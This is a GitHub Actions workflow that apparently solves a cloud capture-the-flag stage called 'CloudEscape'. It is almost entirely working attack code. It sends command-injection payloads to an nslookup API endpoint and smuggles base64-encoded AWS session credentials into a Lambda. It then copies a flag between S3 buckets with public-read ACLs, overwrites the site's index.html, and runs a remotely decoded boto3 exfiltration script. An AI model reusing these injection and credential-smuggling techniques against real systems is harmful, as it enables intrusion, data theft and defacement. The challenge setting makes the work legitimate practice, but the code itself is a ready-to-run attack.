name: CloudEscape Stage 1 - Get Flag v3
on:
  workflow_dispatch:
  push:
    branches: [corgi]

permissions:
  id-token: write
  contents: read

jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Recon - Get CloudFront distribution URL
        id: cloudfront
        run: |
          echo "===== CloudFront distributions ====="
          aws cloudfront list-distributions --region us-east-1 2>&1 | python3 -c "
          import sys, json
          d = json.load(sys.stdin)
          for item in d.get('DistributionList', {}).get('Items', []):
              print(f'  Domain: {item[\"DomainName\"]}')
              print(f'  Id: {item[\"Id\"]}')
              print(f'  Origins: {[o[\"DomainName\"] for o in item.get(\"Origins\", {}).get(\"Items\", [])]}')
              print(f'  Comment: {item.get(\"Comment\", \"\")}')
              print()
          "

      - name: Debug - Test injection with simple echo
        id: debug
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          # Simple test: just echo to a file and check if injection works at all
          echo "=== Test: Simple injection ==="
          curl -s -X POST "$API/dev/nslookup" \
            -H "Content-Type: application/json" \
            -d '{"domain": "x; echo INJECTION_WORKS > /tmp/test.txt; cat /tmp/test.txt"}' 2>&1
          echo
          
          # Can't see output from lambda - let's test if we can write to S3 without creds
          echo "=== Test: Lambda own role S3 access ==="
          curl -s -X POST "$API/dev/nslookup" \
            -H "Content-Type: application/json" \
            -d '{"domain": "x; /opt/bin/aws s3 ls s3://codec4f26c862a321ef5/ 2>&1 || echo S3_DENIED > /tmp/s3test.txt; cat /tmp/s3test.txt"}' 2>&1

      - name: Get flag - S3 read + write to site bucket
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          # Encode creds
          AKID_B64=$(printf '%s' "$AWS_ACCESS_KEY_ID" | base64 -w0)
          SKID_B64=$(printf '%s' "$AWS_SECRET_ACCESS_KEY" | base64 -w0)
          TOKEN_B64=$(printf '%s' "$AWS_SESSION_TOKEN" | base64 -w0)
          
          # Build injection command directly in Python to avoid bash quoting issues
          # The command:
          # 1. Decodes cicdRole creds from base64
          # 2. Sets them as env vars
          # 3. Uses /opt/bin/aws to copy flag from codec bucket to site bucket as flag.txt
          # 4. Also tries to set public-read ACL on the codec bucket flag object
          
          PAYLOAD=$(python3 << 'PYEOF'
          import json, os
          
          akid = os.environ.get('AKID_B64', '')
          skid = os.environ.get('SKID_B64', '')
          token = os.environ.get('TOKEN_B64', '')
          
          if not akid:
              print(json.dumps({"domain": "x; echo NO_CREDS"}))
              exit()
          
          cmd = f"""x; export AWS_ACCESS_KEY_ID=$(echo {akid} | base64 -d); export AWS_SECRET_ACCESS_KEY=$(echo {skid} | base64 -d); export AWS_SESSION_TOKEN=$(echo {token} | base64 -d); export AWS_DEFAULT_REGION=us-east-1; /opt/bin/aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://site781fe43f26b9eba3/flag.txt --region us-east-1 2>/tmp/s3err.txt; /opt/bin/aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://codec4f26c862a321ef5/flag-exfil.txt --acl public-read --region us-east-1 2>/tmp/s3err2.txt; /opt/bin/aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/flag-exfil.txt --acl public-read --region us-east-1 2>/tmp/s3err3.txt; echo DONE > /tmp/exfil_done.txt"""
          
          print(json.dumps({"domain": cmd}))
          PYEOF
          )
          
          echo "=== Sending S3 exfiltration injection ==="
          echo "Payload length: ${#PAYLOAD}"
          curl -s -X POST "$API/dev/nslookup" \
            -H "Content-Type: application/json" \
            -d "$PAYLOAD" 2>&1
          echo
          echo "Waiting 15s for Lambda to complete..."
          sleep 15

      - name: Check results
        run: |
          echo "===== Codec bucket ====="
          aws s3 ls s3://codec4f26c862a321ef5/ --region us-east-1 2>&1 || true
          
          echo "===== Site bucket ====="
          aws s3 ls s3://site781fe43f26b9eba3/ --region us-east-1 2>&1 || true
          
          echo "===== Platform bucket ====="
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1 || true
          
          echo "===== Try direct HTTP reads ====="
          # Try public-read on codec bucket
          echo "--- codec flag-exfil ---"
          curl -s "https://codec4f26c862a321ef5.s3.us-east-1.amazonaws.com/flag-exfil.txt" 2>&1 | head -5
          echo
          
          # Try platform bucket
          echo "--- platform flag-exfil ---"
          curl -s "https://platform-bucket-009661764077-us-east-1.s3.us-east-1.amazonaws.com/flag-exfil.txt" 2>&1 | head -5
          echo

      - name: Get CloudFront URL and check
        continue-on-error: true
        run: |
          echo "===== CloudFront distributions ====="
          aws cloudfront list-distributions --region us-east-1 2>&1 | python3 -c "
          import sys, json
          d = json.load(sys.stdin)
          for item in d.get('DistributionList', {}).get('Items', []):
              domain = item['DomainName']
              print(f'CloudFront: {domain}')
              # Try fetching flag.txt through CloudFront
              import urllib.request
              try:
                  resp = urllib.request.urlopen(f'https://{domain}/flag.txt', timeout=10)
                  print(f'FLAG: {resp.read().decode().strip()}')
              except Exception as e:
                  print(f'Error: {e}')
      - name: Fallback - Try writing flag to site bucket and index.html
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          AKID_B64=$(printf '%s' "$AWS_ACCESS_KEY_ID" | base64 -w0)
          SKID_B64=$(printf '%s' "$AWS_SECRET_ACCESS_KEY" | base64 -w0)
          TOKEN_B64=$(printf '%s' "$AWS_SESSION_TOKEN" | base64 -w0)
          
          # Approach: Copy flag to site bucket as index.html (overwrite)
          # The site bucket is a CloudFront origin - so flag will be served via CloudFront
          
          PAYLOAD=$(python3 << 'PYEOF'
          import json, os
          
          akid = os.environ.get('AKID_B64', '')
          skid = os.environ.get('SKID_B64', '')
          token = os.environ.get('TOKEN_B64', '')
          
          cmd = f"""x; export AWS_ACCESS_KEY_ID=$(echo {akid} | base64 -d); export AWS_SECRET_ACCESS_KEY=$(echo {skid} | base64 -d); export AWS_SESSION_TOKEN=$(echo {token} | base64 -d); export AWS_DEFAULT_REGION=us-east-1; /opt/bin/aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://site781fe43f26b9eba3/index.html --region us-east-1"""
          
          print(json.dumps({"domain": cmd}))
          PYEOF
          )
          
          echo "=== Overwriting site index.html with flag ==="
          curl -s -X POST "$API/dev/nslookup" \
            -H "Content-Type: application/json" \
            -d "$PAYLOAD" 2>&1
          echo
          sleep 15
          
          # Check CloudFront
          echo "===== CloudFront distributions ====="
          aws cloudfront list-distributions --region us-east-1 2>&1 | python3 -c "
          import sys, json, urllib.request
          d = json.load(sys.stdin)
          for item in d.get('DistributionList', {}).get('Items', []):
              domain = item['DomainName']
              origins = [o['DomainName'] for o in item.get('Origins', {}).get('Items', [])]
              print(f'CloudFront: {domain}')
              print(f'Origins: {origins}')
              try:
                  # Invalidate cache first
                  resp = urllib.request.urlopen(f'https://{domain}/', timeout=10)
                  content = resp.read().decode().strip()
                  print(f'Content: {content}')
                  if 'flag' in content.lower() or len(content) < 100:
                      print(f'POTENTIAL FLAG: {content}')
              except Exception as e:
                  print(f'Error: {e}')
          " 2>&1 || true

      - name: Fallback 2 - Use Python boto3 inside Lambda with cicdRole
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          AKID_B64=$(printf '%s' "$AWS_ACCESS_KEY_ID" | base64 -w0)
          SKID_B64=$(printf '%s' "$AWS_SECRET_ACCESS_KEY" | base64 -w0)
          TOKEN_B64=$(printf '%s' "$AWS_SESSION_TOKEN" | base64 -w0)
          
          # Python boto3 script that reads flag and writes to all three buckets
          cat > /tmp/exfil.py << 'PYEOF'
          import os, base64, boto3, traceback
          
          akid = base64.b64decode(os.environ['AKID_B64']).decode()
          skid = base64.b64decode(os.environ['SKID_B64']).decode()
          token = base64.b64decode(os.environ['TOKEN_B64']).decode()
          
          sess = boto3.Session(
              aws_access_key_id=akid,
              aws_secret_access_key=skid,
              aws_session_token=token,
              region_name='us-east-1'
          )
          
          s3 = sess.client('s3')
          
          # Read flag
          try:
              resp = s3.get_object(Bucket='codec4f26c862a321ef5', Key='flag.txt')
              flag = resp['Body'].read()
              flag_str = flag.decode().strip() if isinstance(flag, bytes) else str(flag)
              print(f"FLAG: {flag_str}")
              
              # Write to site bucket
              s3.put_object(Bucket='site781fe43f26b9eba3', Key='flag.txt', Body=flag)
              print("Wrote to site bucket")
              
              # Write to platform bucket
              s3.put_object(Bucket='platform-bucket-009661764077-us-east-1', Key='flag-exfil.txt', Body=flag)
              print("Wrote to platform bucket")
              
              # Overwrite site index.html
              s3.put_object(Bucket='site781fe43f26b9eba3', Key='index.html', Body=flag, ContentType='text/html')
              print("Overwrote site index.html")
              
              # Try public-read ACL on codec bucket
              try:
                  s3.put_object_acl(
                      Bucket='codec4f26c862a321ef5',
                      Key='flag.txt',
                      ACL='public-read'
                  )
                  print("Set public-read ACL on codec flag")
              except Exception as e:
                  print(f"ACL failed: {e}")
              
              # Try copying within codec bucket
              s3.copy_object(
                  Bucket='codec4f26c862a321ef5',
                  Key='flag-exfil.txt',
                  CopySource={'Bucket': 'codec4f26c862a321ef5', 'Key': 'flag.txt'},
                  ACL='public-read'
              )
              print("Copied flag in codec bucket with public ACL")
              
          except Exception as e:
              print(f"ERROR: {e}")
              traceback.print_exc()
          PYEOF
          
          SCRIPT_B64=$(base64 -w0 /tmp/exfil.py)
          
          # Build payload using Python to avoid quoting issues
          export AKID_B64 SKID_B64 TOKEN_B64 SCRIPT_B64
          
          PAYLOAD=$(python3 << 'PYEOF'
          import json, os
          akid = os.environ['AKID_B64']
          skid = os.environ['SKID_B64']
          token = os.environ['TOKEN_B64']
          script = os.environ['SCRIPT_B64']
          
          cmd = f"x; export AKID_B64={akid} SKID_B64={skid} TOKEN_B64={token}; echo {script} | base64 -d > /tmp/e.py; python3 /tmp/e.py 2>&1"
          
          print(json.dumps({"domain": cmd}))
          PYEOF
          )
          
          echo "=== Sending boto3 exfiltration ==="
          echo "Payload length: ${#PAYLOAD}"
          curl -s -X POST "$API/dev/nslookup" \
            -H "Content-Type: application/json" \
            -d "$PAYLOAD" 2>&1
          echo
          echo "Waiting 15s..."
          sleep 15

      - name: Final check
        if: always()
        run: |
          echo "===== Codec bucket ====="
          aws s3 ls s3://codec4f26c862a321ef5/ --region us-east-1 2>&1
          
          echo "===== Site bucket ====="
          aws s3 ls s3://site781fe43f26b9eba3/ --region us-east-1 2>&1
          
          echo "===== Platform bucket ====="
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
          
          echo "===== Direct HTTP reads ====="
          for bucket in codec4f26c862a321ef5 site781fe43f26b9eba3 platform-bucket-009661764077-us-east-1; do
            for obj in flag.txt flag-exfil.txt index.html; do
              echo "--- $bucket/$obj ---"
              curl -s "https://$bucket.s3.us-east-1.amazonaws.com/$obj" 2>&1 | head -3
              echo
            done
          done
          
          echo "===== CloudFront ====="
          aws cloudfront list-distributions --region us-east-1 2>&1 | python3 -c "
          import sys, json, urllib.request
          try:
              d = json.load(sys.stdin)
              for item in d.get('DistributionList', {}).get('Items', []):
                  domain = item['DomainName']
                  print(f'CloudFront: {domain}')
                  try:
                      resp = urllib.request.urlopen(f'https://{domain}/', timeout=10)
                      content = resp.read().decode().strip()
                      print(f'Content (first 200): {content[:200]}')
                      if len(content) < 100:
                          print(f'POTENTIAL FLAG: {content}')
                  except Exception as e:
                      print(f'Error: {e}')
          except Exception as e:
              print(f'Parse error: {e}')
      - name: Try CloudFront with cache invalidation
        continue-on-error: true
        run: |
          # Try to invalidate CloudFront cache to see updated content
          aws cloudfront list-distributions --region us-east-1 2>&1 | python3 -c "
          import sys, json, os
          d = json.load(sys.stdin)
          for item in d.get('DistributionList', {}).get('Items', []):
              dist_id = item['Id']
              domain = item['DomainName']
              print(f'Distribution: {dist_id} ({domain})')
          " 2>&1
          
          # Try invalidation (might need cloudfront:CreateInvalidation which is in Statement1 - VPC only)
          # So we probably can't invalidate from here. But the site index.html might not be cached long.
          
          # Try with cache-busting query param
          aws cloudfront list-distributions --region us-east-1 2>&1 | python3 -c "
          import sys, json, urllib.request
          d = json.load(sys.stdin)
          for item in d.get('DistributionList', {}).get('Items', []):
              domain = item['DomainName']
              try:
                  url = f'https://{domain}/flag.txt?cb={int(__import__(\"time\").time())}'
                  resp = urllib.request.urlopen(url, timeout=10)
                  content = resp.read().decode().strip()
                  print(f'flag.txt via CloudFront: {content}')
              except Exception as e:
                  print(f'flag.txt error: {e}')
              try:
                  url = f'https://{domain}/?cb={int(__import__(\"time\").time())}'
                  resp = urllib.request.urlopen(url, timeout=10)
                  content = resp.read().decode().strip()
                  print(f'index via CloudFront (first 200): {content[:200]}')
              except Exception as e:
                  print(f'index error: {e}')
          "